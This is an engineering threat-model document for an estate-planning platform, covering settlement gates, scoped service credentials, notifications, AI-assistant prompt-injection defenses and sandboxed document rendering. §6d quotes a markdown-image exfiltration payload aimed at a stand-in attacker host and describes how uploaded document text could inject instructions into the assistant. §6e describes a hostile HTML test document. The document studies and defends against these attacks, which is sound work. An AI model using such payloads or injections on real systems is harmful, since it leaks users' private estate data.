- *§6a closed.* The vault's emergency-access `request` AND `release` now
  consult settlement — twice, once before the waiting clock starts and again
  inside the release transaction after the row lock, because the period is
  days long and an estate can enter settlement in between. A non-terminal case
  without an approved `vault` stage BLOCKS; so does an unreachable settlement,
  since the client fails closed on every path. That direction is deliberate:
  blocking delays a legitimate recovery (the escrow is unspent and releases
  once the stage lands), while allowing hands a fraudulent "heir" the platform
  half of the recovery key inside the very window §5.1 exists to protect.
  Refusals are audited as `vault.emergency.release_blocked` with the case id.
  The gate is authenticated by the SERVICE credential, not the grantee's
  bearer — the question is about the owner's estate, not the caller's rights.
- *Distributions under dual control* (docs/02 §7): the recorder is stamped from
  the verified session at insert, the approver must differ, and a row-local
  CHECK enforces it immediately rather than a trigger (both parties are columns
  of the same row, so a CHECK is stricter — undeferrable and unbypassable).
  Amounts are envelope ciphertext under settlement's own `settlement/kek`, so
  profile's KMS grant cannot read them even sharing the cluster; the plaintext
  never enters a column, a log, or an audit payload.
- *Estate reads are the data owner's decision.* Assets exposes a separate
  executor route that forwards the caller's bearer to settlement and refuses on
  anything short of an explicit allow; settlement itself holds no data-read
  power, so compromising it mis-answers questions rather than exfiltrating an
  estate. Each such read is audited as `asset.estate.viewed` with the decedent
  as `onBehalfOf`.
- *Legal hold* (docs/00 compliance) is now settable — by settlement only,
  through a service-credential internal route, closing the M4 gap where the
  hold was enforced but had no writer.

**Residual added by PR2.**

- **[OWNER: M21]** *An insider operator plus a colluding executor is a
  two-party path to an estate.* A settlement operator can approve every stage
  of a case they did not report. Bounded by: the executor designation must
  already exist in the decedent's own contact records (made before the death),
  the reporter≠reviewer and requester≠approver rules, the waiting period and
  owner-void that precede any of it, and a fully audited trail. Reducing it
  further needs M-of-N operator approval, which belongs to the TB7
  operator-platform milestone alongside JIT elevation.

**Residuals accepted.**

- **[OWNER: M21]** *The liveness interlock narrows the lockout race to a single
  statement and cannot erase it.* A step-up committing inside that statement's
  window is still missed. The blast radius is bounded — after the transition,
  sessions are revoked and the status allowlist blocks every session lookup, so
  the step-up buys nothing and the attempt is preserved in `auth_events` for
  after-the-fact review — and closing it completely would require the step-up
  path to take the users row lock, which is the right shape for the
  operator-platform milestone rather than a settlement-side fix.
- **[OWNER: M21]** *The interim allowlist has no JIT elevation and no peer
  approval, and one operator both approves and confirms a case* — two actions,
  one human, on the docs/03 §5.1 chain. A settlement operator is a high-value
  target. Bounded by reviewer≠reporter, the liveness re-check, the owner's
  void, and the append-only audit trail; PR2's stage approvals add multi-party
  depth. M21 PR1 gave the allowlist an audited ceremony, which is attribution
  rather than elevation — the two controls named here are still owed.
- **[OWNER: M21]** *Rate limiting on settlement intake is still open, and M17
  PR1 did not close it.* That change bounds identity's own login and register
  routes (§6k); settlement's intake authenticates its callers and would need a
  per-reporter bound of its own. Noise remains bounded by the linked-contact
  gate and the one-open-case index. Filed against the same owner as §6z's
  unbounded operator actions because both are the same absent machinery in the
  same service, and splitting them across milestones is how one of them gets
  built and the other keeps its exemption.

**Service-credential scoping (added by the M7 security review, 2026-07-28).**
The internal service credentials introduced for the account lock and the §6a
gate are the one M7 mechanism that can bypass §5.1's control chain outright, so
they carry their own rule: **one secret per callee, per direction.** Each
variable is named for the service whose internal routes it OPENS
(`IDENTITY_INTERNAL_TOKEN`, `SETTLEMENT_INTERNAL_TOKEN`,
`DOCUMENTS_INTERNAL_TOKEN`), never for the caller that presents it, and no
value ever authenticates in both directions.

The review found the original design violating this: settlement used one config
field as both its inbound-expected and its outbound-presented value, which
transitively forced identity, settlement, vault and documents onto a single
shared secret. Anyone holding vault's copy — the most exposed service in the
product, and by Zone A design the one that should hold the least authority —
could call `PUT /internal/v1/settlement-lock/{victim}` twice and irreversibly
move a living user to `settlement` status with no case, no operator, no waiting
period and no owner-void window. That is §5.1's Critical outcome reached by
skipping every control above, and it is the sharpest illustration of why the
credential is scoped rather than shared: a static bearer secret confers exactly
the routes it opens, so the blast radius IS the naming discipline.
Settlement's config refuses to boot in production when its two credentials are
equal, because splitting the field does not stop an operator pasting one value
into both slots. Rotation remains a synchronized restart of two services; the
mesh mTLS/SPIFFE follow-up removes the static secret rather than improving it.

## 6c. Threat-model delta — M9 notifications (2026-08-04)

M9 turns the §6a/§6b notification PRECONDITIONS into a running control: the
notifications service (docs/01 §2.10, TB5's carrier boundary) delivers the
owner notifications that the emergency-access and settlement waiting periods
rest on. Controls shipped, each mapped to what this document demanded:

- **Content-free pointers are enforced by construction, not convention
  (§5.4, risk #10).** The wire schema has no text field — a closed kind enum,
  a user id, a requested channel, an optional deadline — so a compromised
  caller can trigger a template, never author a message. The template
  registry carries no user data beyond the deadline DATE, uses ONE uniform
  SUBJECT for every kind, and contains NO links of any kind. The production
  e2e asserts all three properties on a real delivered message.
  SCOPED PRECISELY (M9 security review): the uniform subject means a mailbox
  observer who sees only subject lines cannot tell which control fired, but
  the BODY names it in its first clause ("…asked for emergency access to your
  Estate vault", "A report was filed on your Estate account"). That is
  deliberate — an actionable body is what makes the notification a control
  rather than a curiosity — but it means a lock-screen preview and the
  carrier both learn the EVENT CLASS. See the residual below; the earlier
  claim that an observer "never learns WHICH control fired" was true of the
  subject only and is corrected here.
- **Recipient addresses never cross a cluster boundary (§5.3).** The service
  keeps its own store, AEAD under its own `notifications/kek` (core
  co-tenants cannot unwrap it), fed by identity at the two plaintext moments
  (registration, login). No email-ciphertext read path exists anywhere; no
  blind index exists on the store (nothing legitimate asks "which user has
  this address"). Every send's decrypt is a logged event.
- **The gates stay, and became visible.** The per-route 503s remain as
  defense in depth behind the production adapter pins (`NOTIFY_MODE=http`,
  `EMAIL_MODE=ses`), and now emit `vault.emergency.notifications_refused` /
  `settlement.notifications_refused` — a control firing must be
  distinguishable from an outage in the stream operators watch.
- **The credentials are scoped (§6b's rule), and there are TWO.** Corrected by
  the M9 security review, which found ONE credential opening both surfaces:
  `NOTIFICATIONS_INTERNAL_TOKEN` opens SEND only (holders settlement, vault),
  and `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN` opens the recipient upsert
  and is held by IDENTITY ALONE. The split matters because the two
  capabilities have different blast radii: sending is bounded spam, while
  deciding where a user's notifications GO is the power to silence the §5.1
  contact sweep and the §5.2 waiting-period alerts. Merged, vault's copy
  could silence settlement's death-case alerts and settlement's could silence
  vault's emergency-access alerts — cross-domain, and exactly what one secret
  per callee exists to prevent. Enforced by two guards binding two DI tokens;
  the service refuses to boot in production if the two values are equal, and
  pairwise aliasing refusals extend to both in every holder.

**Residuals, accepted and recorded:**

- **[OWNER: E4]** *Email is the only live channel.* §5.2's "multi-channel" and §5.1's
  "every channel including hardware-key challenge" remain aspirational;
  the contact trail records channel INTENT (push/sms/voice) while delivery is
  email. SMS/push arrive with their own carriers and their own review.
- **[OWNER: M27]** *No one-tap deny token yet.* Deny remains an in-app action ("open your
  Estate app"); an email-borne deny capability needs the vault UI's isolated
  origin to exist and its own token design + review. Until then the
  notification shortens discovery time but not the deny path.
- **[ACCEPTED]** *Repointing an EXISTING user's address needs identity's credential.* Since
  the M9 review's split this is true as written: only
  `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN`, held by identity alone, can
  change where a user's alerts go. (Before the split it was false — vault's
  and settlement's copies sufficed, and this document said otherwise.)
  Recipient changes are versioned and audited, but see the next residual.
- **[OWNER: E1]** *The recipient-change audit cannot ATTRIBUTE.* `notification.recipient.updated`
  carries `actorId: null`, `actorType: 'service'` and an empty detail, the
  versions trigger stamps the system sentinel, and identity emits the same
  event on EVERY successful login — so the trail proves that an address
  changed and preserves the prior ciphertext, but cannot distinguish a
  legitimate login-time refresh from a malicious repoint. It is evidence for
  after-the-fact recovery, NOT a detection control, and should not be cited
  as one. Closing it means recording the calling service, which the static
  shared-secret model cannot do — it arrives with the mesh's peer identity.
- **[CLOSED: §6h]** *Users' addresses are UNVERIFIED.* **CLOSED by M14** — see §6h. The residual
  as it stood: registration performed no ownership proof, identity fed whatever
  the user typed into the delivery store, and `users.email_verified_at` was
  never written or read, so "identity's word" meant the address was TYPED, not
  OWNED. `users.email_verified_at` remains dead schema deliberately; the
  verified bit lives on `notification_recipients`, in the store that would have
  to do the reaching.
- **[OWNER: M30]** *The carrier sees addresses, timing, AND the event class (TB5).* Inherent
  to email, and wider than previously recorded here: the body names which
  control is running, so SES and the receiving provider get a per-address
  labelled event stream ("this account is in a death-review period"). The
  content-free doctrine bounds this to the event class — never estate
  content, never a name, an asset, a document title or a link — but it does
  not eliminate it. Closing it fully needs an out-of-band or encrypted push
  channel, i.e. the vault UI's isolated origin. SES supply-chain posture
  rides the existing AWS SDK pinning.
- **[OWNER: M27]** *`emergency.reminder` is declared but never emitted* (vault has no
  scheduler); the sweep-driven reminder belongs with Temporal or a later
  driver.

**The M6 delivery-channel identifier leakage item: PARTIALLY CLOSED.**
Answered by the M9 security pass rather than left owed. Closed, by
construction: no caller-authored text anywhere (the wire has no text field),
no identifiers of any kind in a message (no name, address, asset, document
title, case id, user id or token — the only variable is a date), no links at
all so no per-recipient URL can re-identify a recipient to the carrier, one
subject across all nine kinds, and addresses that never cross a cluster
boundary. Still open, and now recorded above rather than claimed closed: the
EVENT CLASS reaches the carrier and any body-preview observer, and that is
accepted deliberately because an actionable body is what makes the
notification function as a control. Fully closing it is the isolated-origin
push channel, a later milestone.

## 6d. Threat-model delta — M10 AI assistant PR1 (2026-08-04)

The assistant is the first component an attacker can address in **natural
language**, through document text the owner uploaded and asked it to read. Risk
#6 ("LLM prompt injection via uploaded docs", H/M) stops being a forecast here.

**Treatment, in the order it actually holds.** The register's stated treatment
was "untrusted-input framing, read-only tools, output filtering". Building it
made the ordering clear, and the ordering is the finding:

1. **No tool schema can name a subject.** A tool receives its authority — the
   verified session subject plus that caller's bearer — and declares only what
   to fetch, never whose data. Injected text can persuade the model to CALL a
   tool; it has no field in which to say whose estate it wants. Enforced at
   registry construction, so a violation is a process that will not start.
2. **No sink.** Every tool is read-only; there is no send, write, outbound-fetch
   or web-search tool. The worst a successful injection achieves is a
   misleading answer to the owner about the owner's own data, which is exactly
   why the impact rating is Medium and what keeps it there. Adding any
   outward-facing tool would change that rating and requires revisiting this
   section.
3. **Framing retrieved text as data is ADVISORY** and is documented as the
   weakest layer in its own source file. It neutralizes delimiter injection so
   content cannot terminate its own block, but a sufficiently clever payload can
   argue with layer 3. Layers 1 and 2 cannot be argued with.

"Output filtering" is deliberately NOT claimed as a control.

**MODEL-OUTPUT EXFILTRATION — CLOSED IN M11, and worth reading as a history of
how nearly it was not.** An M10 draft of this paragraph credited PR4 with
"restricted markdown, no autolinking, no remote images". PR4 shipped no
conversation UI and no renderer at all, so the paragraph dispositioned a live
risk against a control nobody had built — the M4 legal-hold zero-callers shape,
in prose. The M10 security review caught it and reopened the requirement, owed
by whoever shipped the chat surface, in the same PR as the first pixel of
model-authored text.

M11 is that PR, and the constraint is now real. `MessageText`
(`apps/web/src/components/MessageText.tsx`) is the ONLY renderer any message
gets, in either role, and it builds text nodes: no parser, no allowlist, no
`dangerouslySetInnerHTML` (a source scan over the whole app enforces that, with
`app/layout.tsx`'s theme script as the one declared exemption). A model-emitted
`![](https://attacker/?data=…)` renders as those characters — verified in a real
browser against a payload carrying a markdown image, a markdown link and a raw
`<img>` tag: zero image elements, zero anchors to the payload's host, zero
network requests to it.

Behind it, and independent of it, the app now sends a Content-Security-Policy
with `img-src 'self' data:` and `connect-src 'self'`, so the browser refuses a
remote image load even if a future renderer regresses. **That CSP is
deliberately not complete**: `script-src` still allows inline, because Next's
hydration bootstrap and the theme script are inline and locking them down needs
per-request nonces through middleware. Saying so plainly is the point — a
stricter directive that gets relaxed under deploy pressure would be worse than
an honest partial one.

It remains a rendering constraint rather than a filter on model output; calling
it filtering would overclaim. The cost is stated where it lands: answers render
as plain prose with no lists or emphasis, and whoever adds formatting inherits
this requirement, because adding a parser here is adding a sink.

**TB5 — the LLM provider boundary.** The assistant is the isolating service:
the provider SDK and its credential will exist only there (PR2). It holds NO
internal service credential in either direction, so a compromised assistant
replays the sessions it is currently serving and cannot mint new authority —
the property is machine-checked by the credential graph rather than asserted.
Conversation transcripts are Zone B under a dedicated `ai-assistant/kek`, and
they are persisted precisely so the client cannot supply history: a
client-supplied transcript could forge prior assistant turns and prior tool
results, and a forged tool result is indistinguishable from a real one.

**A constraint our own requirements impose on model choice.** docs/03 §4 TB5
requires providers under zero-data-retention agreements. Claude Fable 5
requires 30-day retention and is not available under ZDR, so the most capable
model is disqualified by our own threat model; PR2 targets a ZDR-eligible model.

**Consent.** Deny by default structurally — there is no `granted` boolean, so
a user who never answered and one who revoked are the same answer. Granting is
step-up gated because it widens third-party egress (export-class under docs/01
§5); revoking is not, on the M6 rule that the protective action must never be
harder than the permissive one.

**Recorded, not fixed.**
- **[OWNER: M33]** *Uploaded-document text remains unreadable by anything.* M4's OCR artifact has
  no decrypt counterpart and M10 does not add one, so the assistant cannot
  discuss anything a user uploaded. That is a capability gap, not a control —
  closing it means building a bulk-readable text path, which is what §5.3
  exists to prevent, and it needs its own PR, consent scope and delta.
- **[OWNER: M23]** *Conversations are outside staged settlement access (§6a).* An executor gets
  inventory, then documents, then vault; conversations are in none of those
  rungs and `assistant.cedar` grants no role-holder verb. A transcript ranges
  over the whole estate and may contain content the owner never intended anyone
  to read, so admitting it would need its own milestone and its own decision.
- **[ACCEPTED]** *The egress assertion is narrow on purpose.* It refuses separated SSNs and
  Luhn-valid card numbers and deliberately passes names, emails and phone
  numbers, which are the PR2 tokenizer's job. A gate that fires on ordinary
  estate traffic is one people route around.

## 6e. Threat-model delta — M12 documents surface PR1 (2026-08-06)

M4 built the document service; nothing rendered a document until now. The new
surface is a place where **stored document content reaches a screen**, which
puts risk #6 (LLM prompt injection via uploaded docs, H/M) next to a second,
older question this repo had not yet had to answer: what happens when the
browser is handed a document's own markup.

**The renderer, and why it differs from `MessageText`.** §6d's answer for model
output was an ABSENCE — text nodes, no parser, no sink. A document cannot be
rendered that way and still be a document, so `DocumentViewer`
(`apps/web/src/components/DocumentViewer.tsx`) substitutes CONTAINMENT: the
bytes go into a `srcdoc` iframe with `sandbox=""` — the empty value, which
grants nothing: no scripts, no same-origin, no forms, no popups, no top-level
navigation. The component reads nothing and parses nothing, and it adds no
`dangerouslySetInnerHTML`: the M11 source scan covers the new files unchanged
and still allows exactly one use, `app/layout.tsx`'s theme script, which M11
declared as data. (An earlier draft of this paragraph said "anywhere in the
app" and dropped that declared exemption — corrected in the M12 review, since
a doc that overstates a control is the defect class this repo keeps finding.)

Three layers hold it, and only the first two are relied on:

1. **The sandbox.** No script executes, and the frame is in an opaque origin
   with no access to the app's DOM, storage or cookies. `allow-scripts` and
   `allow-same-origin` TOGETHER would undo the whole thing, so the exact value
   is asserted in the component's spec rather than matched as a substring.
2. **The page CSP.** A `srcdoc` frame inherits the embedding document's policy,
   so `img-src 'self' data:` and `connect-src 'self'` apply INSIDE the frame:
   a remote image smuggled into document text is refused by the browser, not by
   anything we wrote. This is the same CSP §6d describes, doing a second job.
3. **The `csp` attribute** (`default-src 'none'`), Chromium-only and stated
   here as defence in depth rather than as the control.

**Verified against a hostile document in a real browser**, not only in jsdom: a
payload carrying a remote `<img>`, an inline `<script>` writing to the parent, an
`onerror` handler, an off-origin `<form>`, a `target="_top"` link and a nested
remote iframe was substituted into the content response and rendered through the
real component. Result: zero network requests to the payload's host, the script
probe never fired, no element from the payload entered the parent DOM, and
`contentDocument` was unreachable from the page.

**A SECOND FENCE ships with it**, because the realistic regression is not an
edit to the viewer: a source scan asserts that `DocumentViewer.tsx` is the ONLY
file in the app that renders an `<iframe>`. A frame added elsewhere for a
preview or an embed would reopen the channel from a file nobody thought of as a
renderer — the credential-graph habit of stating the exception as data.

**What is NOT framed.** Only `text/html` with `encoding: utf8` reaches an
iframe, which is generated content — platform-rendered from a sha256-pinned
template with every substituted value HTML-escaped by the service. An upload can
never be `text/html` (the ingest sniff admits pdf/png/jpeg/tiff only), and the
component checks rather than trusting that invariant from a distance. Presenting
uploaded binaries is PR2's problem and gets its own decision.

**Audited-decrypt volume is a design constraint on this surface, not a
side effect.** Every content read emits `crypto.field.decrypted` +
`document.content.viewed` and consumes a KMS operation, so a list that
previewed content would convert one page load into N events on the user's own
trail and blunt exactly the per-principal decrypt-rate baseline §4 TB4 calls the
single most important insider control. Hence: metadata-only lists, no content
field on the document type, no prefetch, and no cache that would make a repeat
read invisible. Proven live against the stack — two Read presses produced
exactly two decrypt pairs, and loading the list and detail pages produced none.

**Recorded, not fixed.**
- **[OWNER: M21]** *The 404-vs-403 oracle is narrowed at the edge, not closed.* The BFF answers
  the uniform not-found for a plain downstream 403, so browser traffic cannot
  tell "no such document" from "someone else's". The service still
  distinguishes them for any other caller — the M4 review's open follow-up,
  unchanged, and the real fix belongs there.
- **[ACCEPTED]** *`documents.title` remains plaintext* (the M4 decision, on the
  `assets_view.title` precedent). The generate form now says so where the field
  is, rather than leaving users to infer that the title is protected like the
  contents.
- **[OWNER: M35]** *`script-src` is still not locked down*, exactly as §6d states. The sandbox
  does not depend on it: `sandbox=""` blocks script execution inside the frame
  whatever the page policy permits outside it.

**PR2 addendum — ingest, the ladder, and deletion (2026-08-06).**

*The upload gate is the SERVER's, and the client is built not to have an
opinion.* Magic-byte sniffing against the declared mime is the control against
polyglot mislabeling, and the malware scan is fail-closed and pre-storage, so
every refusal means the bytes reached no disk. A client-side type check would
be a second opinion that can disagree with the one that matters — so there is
none: `accept` is a picker hint, `file.type` is forwarded as a declaration, and
the only local check is the size cap, mirroring the server's own number. The
three refusals are kept apart to the last layer (`MALWARE_DETECTED`,
`UNSUPPORTED_CONTENT`, `SCAN_UNAVAILABLE`) because softening a positive scanner
finding into "unsupported file type" would withhold the one thing a user needs
to know about a file somebody sent them. Verified live against real clamd
through the browser: the signature-carrying PNG was refused and nothing stored.

*The execution ladder is computed where the requirements are verified.* Risk #8
is a legal/compliance failure in a state template, treated by "attorney-gated
template releases; per-state execution-requirement engine". A UI that hardcoded
the ladder would be a second copy of that engine, drifting toward the weakest
rung — which is precisely the fail-open the M4 review closed inside the
service. So the service returns `allowedTransitions` from its own
sha256-verified template source, the UI renders exactly that, and the write
path re-resolves the requirements inside its own transaction regardless. An
unverifiable template yields an EMPTY ladder, not a guessed one.

*Presenting an uploaded binary — the decision PR1 deferred.* Images render
INLINE from a `data:` URI: the page CSP already allows `img-src 'self' data:`,
the bytes reach the browser's image decoder (the same exposure any image on any
page carries), and a `data:` URI cannot reach the network. The mime is the
SERVICE's sniffed value, not the uploader's claim, and it is checked against a
closed set before it is interpolated, so no attacker-chosen string becomes the
type of a URI this page constructs. PDFs and TIFFs DOWNLOAD instead: a framed
PDF is the browser's PDF engine — a large parser — invoked on attacker-supplied
bytes inside our own frame tree, whereas a download hands the file to whatever
the user already trusts. The filename is generated from ids, never from
`documents.title`, because a filename is where user text ends up in a shell, a
sync client, or a mail header. Leaving this deferred a second time had a cost
the M12 review named: `Read` was offered for versions the viewer then refused,
so an audited decrypt was spent to display nothing.

*The search term left the URL.* `GET /v1/documents/search?q=` was M4's shape,
and M12 was its first caller. The term is by construction a word out of the
user's own estate — a beneficiary's name, a property address — and a query
string is the one part of a request intermediaries record by default; the
topology docs/01 §2 describes puts CloudFront and WAF access logs in that path.
It is a POST with the term in the body now. Nothing else changed: the term is
still reduced to per-user HMAC tokens and matched ciphertext-side, and no
decrypt happens to serve a search.

*Deletion.* Step-up gated per docs/01 §5, and the legal hold wins over the
owner. Running the real app exposed an ordering seam worth recording: the
step-up guard sits at the controller and the hold check inside the handler, so
a stale session is told `stepup_required` first and the hold only after. That
ordering is fine as defence in depth, but the UI must not send someone to find
an authenticator for an action that will be refused either way — a held
document is now not offered for deletion at all. RECORDED, NOT CHANGED: the
service's ordering, since moving the hold check ahead of the guard would put an
unauthenticated-for-this-action read of estate state before the gate.

## 6f. Threat-model delta — M13 people surface PR1 (2026-08-06)

M13 gives the M2 profile & contacts service its first consumer. PR1 hardens what
was already deployed, before anything is built on top; the surface itself (PR2)
and the contact-link ceremony (PR3) extend this section.

**TB8 (role-holders → owner's estate data) had no step-up gate on its own
control objects.** §5.5's boundary is enforced by `role_assignments` and
`permission_grants` — they are the data that decides what a beneficiary can
read. Creating one is a docs/01 §5 step-up action in terms ("trustee/executor
changes, beneficiary changes"), and M2 shipped all three mutation routes under
`CallerGuard` alone because it predates `@estate/auth-guard`; the sibling
beneficiary route in the asset service complied. So a bearer token stolen from a
live session was sufficient to name a trustee over an entire estate. Closed:
grant, revoke and permission-attach all require a step-up fresh within 5
minutes, uniformly across all twelve roles.

*Why revoke is gated and permission-withdrawal is not.* The M6 rule is that the
protective action must never be HARDER than the permissive one — equal is
allowed. Revoking an assignment is not purely protective in this domain: it
destroys the executor-resolution path M7 depends on and can strip the last
linked contact able to report a death or rescue a §5.1 case, so an attacker who
revokes is isolating the owner, not protecting them. Withdrawing one permission
grant genuinely only narrows, so it is `CallerGuard`-only — an owner who can see
a grant they regret must be able to pull it without first finding their
authenticator.

**A §5.1 control was revocable by accident, twice.** `contacts.linked_user_id`
is the anti-enumeration gate this document credits (§6b: intake "cannot
enumerate" *because* reporters must already be named by the decedent's contact
repository). Two ordinary, unaudited operations silently removed it:

- Editing any field of a contact cleared the column, because one encrypt helper
  hardcoded it null and fed both the insert and the update. Closed by type: the
  shape both statements are built from has no such key.
- Soft-deleting a contact left its `role_assignments` live while every
  role-holder query joins `contacts ... AND deleted_at IS NULL`, so an executor
  stopped resolving and every grant stopped being effective with the assignment
  still listed and no `role.revoked` emitted. Closed with `409 contact_in_use`:
  retiring a fiduciary is a separate, step-up-gated, audited act.

Both are the same class as the M7/M9 findings — a control that stops working
without saying so, indistinguishable from one that is working.

**A Zone B write path destroyed the most sensitive column in the product.**
`PUT /v1/profile` was a full replace while `GET /v1/profile` returns `ssnLast4`
and never `ssn`, so any edit through any client wrote NULL over `ssn_ct` and
`ssn_last4_ct`. Now absent means unchanged. The preservation deliberately copies
CIPHERTEXT: decrypt-and-re-encrypt would put the full SSN through the service on
every unrelated edit and emit a `crypto.field.decrypted` on `profile.ssn` each
time — pure added exposure on the §5.3 bulk-decrypt path in exchange for
nothing. A row whose `dek_id` is no longer the owner's active DEK (crypto-shred)
is refused rather than re-stamped, so an erased record cannot be made to look
intact.

**RECORDED, OWED BY PR2 (§4 TB4).**

- **[CLOSED: §6f]** *A list view was a bulk-decrypt surface.* Contact and
  family-member reads decrypt every field, one audited
  `crypto.field.decrypted` each, so twenty contacts was roughly a hundred
  events on the owner's own trail per page load — blunting the per-principal
  decrypt-rate baseline this document calls the single most important insider
  control. The DEK cache means it was never a hundred KMS operations, which is
  the weaker half of the control. PR1 did not change it; PR2 owed a narrowed
  list projection under M12's audited-decrypt-volume rule, and that paragraph
  was the requirement rather than an observation. **Discharged for contacts by
  PR2**: the contact list now spends one audited decrypt per row and the values
  have no field on the wire at all.
- **[ACCEPTED]** *Deliberately NOT discharged for family.* The family list
  still decrypts every field it stores, and that is a scope-down with a reason
  rather than an oversight: the household panel RENDERS name, date of birth,
  minority and notes, so there is nothing to narrow — four of five contact
  fields were unused by a list, and zero of four family fields are. The volume
  differs by an order of magnitude too (a household is a handful of rows; an
  address book is not). If a future surface lists family members without
  showing them, it inherits the PR2 requirement above.

## 6g. Threat-model delta — M13 the contact link ceremony (2026-08-06)

`contacts.linked_user_id` had no write path anywhere in the platform until this
change. That is why §6b could credit the linked-contact gate for intake being
unable to enumerate while nobody could actually become a linked contact: the
control was real and the capability behind it was unreachable. M13 PR3 makes it
reachable, which activates every consequence §6b described.

**What a link confers, stated in one place.** Being the linked user of a
contact means: eligibility to open a settlement case against that owner (§5.1
control 1's reporter test), resolvability as their executor when a case is
verified (§5.1 control 5), and effectiveness of any `permission_grant` attached
to a role assignment naming that contact (§5.5). None of those is granted by the
link alone — each needs its own separate step — but none of them is reachable
without it.

**The ceremony.** Owner mints a 160-bit single-use code under step-up; the
server stores only its sha256; the owner is shown it ONCE and delivers it out of
band; the contact redeems it while authenticated on their own existing account.
Three properties are load-bearing:

- *No address is handled anywhere.* M9's shipped doctrine gives the notification
  wire no content field and forbids links, so an emailed invitation would have
  contradicted a decision made one milestone earlier. It also means this flow
  adds no second home for a contact's email address.
- *The code is the ONLY selector on redemption.* The route takes no owner id and
  no contact id — there is no parameter in which to name an account, so
  redemption cannot become an oracle for whether one exists. This is the same
  property §6b credits intake with, preserved rather than re-argued.
- *The redeemer must already have an account.* Not an invite-to-register flow,
  and it cannot be used to create one.

**Uniform refusal.** Unknown, expired, spent, revoked, self-directed and
raced-away codes all answer `invalid_code`, byte-identical. Distinguishing them
would tell whoever holds a guess that the guess named something real. Accepted
cost: a legitimate user gets a vaguer message, paid down by letting the owner
re-issue freely (which retires the previous code and audits the retirement).

**Gate asymmetry, in both directions.** Minting is step-up gated — it hands out a
capability on the §5.1 chain, so it sits with naming a fiduciary. Withdrawing an
unused code and removing a live link are `CallerGuard` only, on the M6 rule that
the protective action must never be harder than the permissive one. Redemption is
`CallerGuard` only because the authority is the code.

**FLAGGED DEVIATION: redemption takes no Cedar decision.** Every other route in
this service passes a PEP first. Redemption cannot: the redeemer has no
relationship to the estate until it succeeds, so every attribute a policy could
match on is precisely what the code stands in for, and a decision there would
read `deny` until the moment it read `allow` for reasons the policy could not
see. The authority is a bearer capability. Recorded here rather than disguised.

**Notifications are a PRECONDITION in production, and the send's OUTCOME is
recorded.** Redemption refuses (503 `notifications_unavailable`, separately
audited) behind an adapter that reaches nobody — the M6/M7/M9 rule. Behind a real
adapter the send is best-effort by design (a notification failure must never roll
back the state change it describes), but never silent: the claim's audit event
carries `ownerNotified: delivered|failed`, the vault delivered_at-NULL precedent,
so a non-delivery is a recorded fact rather than an absence. The notify also runs
BEFORE the audit emit, because the emit propagates broker failures by design and
must not be able to cancel the notification — the code is spent by then and no
retry would ever re-send it. The reason is specific: a claim the owner never
hears about is how a code that went to the wrong person becomes an invisible
authorization edge, and the owner's out-of-band channel is this ceremony's trust
anchor, so their after-the-fact visibility is what makes the anchor auditable.
Profile therefore becomes the third holder of the notifications SEND credential —
and deliberately not of the RECIPIENTS credential, so it can never repoint where
anyone's alerts go (the M9 review's split, applied to a new holder).

**Atomicity is a control, not hygiene.** Spending the invitation and writing the
link happen in one transaction with each statement restating its own
preconditions. A spend with no link would lock that contact out of ever being
linked; a link from an invitation still live would be replayable. Two concurrent
redemptions of one code therefore produce exactly one link and the loser rolls
back — the CAS shape §6b's owner-liveness interlock uses, for the same reason.

**ACCEPTED RESIDUALS, stated rather than implied.**

- **[ACCEPTED]** *The owner's channel is the trust anchor.* An owner who sends the code to the
  wrong person links the wrong person. Detected rather than prevented: audited on
  both sides with the redeemer as actor, notified to the owner, visible in their
  contact list, and removable in one click. Identical in kind to M6's
  grantee-fingerprint confirmation.
- **[OWNER: E1]** *The attempt cap bounds an online attack on a REAL code only.* An unknown code
  leaves no row to count against, by construction. 160 bits is what makes
  guessing infeasible; the counter is what an alert would watch. General
  per-caller rate limiting on the redeem route is edge work (§4 TB1 — i.e. the
  WAF, and therefore **E1**, the AWS half; the owner is named here rather than
  left one hop away, because a pointer to a category is how a deferral goes
  uncosted) and is
  UNCHANGED by M17 PR1, whose two bounds key on an account and on a submitted
  address — a redeem request carries neither, which is the same "nothing to
  attribute a count to" that makes the row-keyed cap weak here (§6k).
- **[ACCEPTED]** *A code lives in the owner's session response and wherever they put it next.*
  It is not stored recoverably server-side, but it is a secret in a browser for
  as long as that page is open, and in whatever channel the owner chooses. That
  is inherent to an out-of-band ceremony.
- **[OWNER: M22]** *Unlinking does not revoke what the link already enabled.* A settlement case
  the linked contact opened before being unlinked stays open — cases are evidence
  and have no soft delete (§5.1 c6) — and is stopped by the owner's own
  step-up-gated void route, not by unlinking.

## 6h. Threat-model delta — M14 address ownership (2026-08-07)

**What was wrong.** Three shipped fail-closed controls — §5.2 emergency access,
§5.1 settlement intake and review-approve, and §6g's link ceremony — refuse in
production rather than proceed silently, on the rule that a waiting period
nobody can be told about is not a control. All three tested
`deliversToRealChannels`, which is A PROPERTY OF THE ADAPTER, NOT OF THE
RECIPIENT: a hardcoded literal on whichever adapter class that service's own
`NOTIFY_MODE` selected, declared independently three times, `false` on the stub
and `true` on the HTTP one. It asks whether SES is wired. It never asks whether
the stored address belongs to the owner, and could not — the bit never left the
process and never named a recipient. So the gate was satisfied, the escrow
armed or the five-day clock started, and the owner's ability to INTERRUPT — the
entire content of §5.2 and of §5.1's control 3 — was unenforced.

The sharp part was an anti-correlation: the only self-heal was identity's
login-time re-feed, so the stored address was freshest for active users and
STALEST for the dormant owner a fraudulent death report actually targets — and
once status reaches `settlement`, login is blocked, so it could never heal.

**The ceremony.** Identity mints a 160-bit code at FIRST AUTHENTICATED LOGIN
(never at registration — an unauthenticated route would be a mail-bomb and
sender-reputation primitive; **M17 PR1 falsified the second half of this
parenthesis, and the decision stands on the first half alone** — register now
carries an address-keyed bound (§6k), but it is per-process and best-effort,
which is not something to hang a mail-bomb defence on, and firing a notification
kind at an unauthenticated route would still be reachable by anyone holding a
victim's address), stores only
its sha256, mails it through notifications' own credential-scoped route, and
marks the address verified when the user returns it. One uniform `invalid_code`
for unknown, expired, spent, revoked, attempt-exhausted, someone-else's and
raced; free re-issue behind a five-minute floor.

**The verified bit lives on `notification_recipients`**, not on `users`, so the
delivery store structurally cannot hold an unproven address without saying so.
`users.email_verified_at` stays dead rather than becoming a second source of
truth.

**Gate classification.** A verified address gates CAPABILITY-ARMING actions, not
case-opening ones:

| requires verified (refuses) | proceeds and records |
|---|---|
| vault escrow `configure` | vault `request`, vault `release` |
| vault `rearm` | profile link redemption |
| profile link-code `invite` | settlement `report`, provider signal, review-approve |

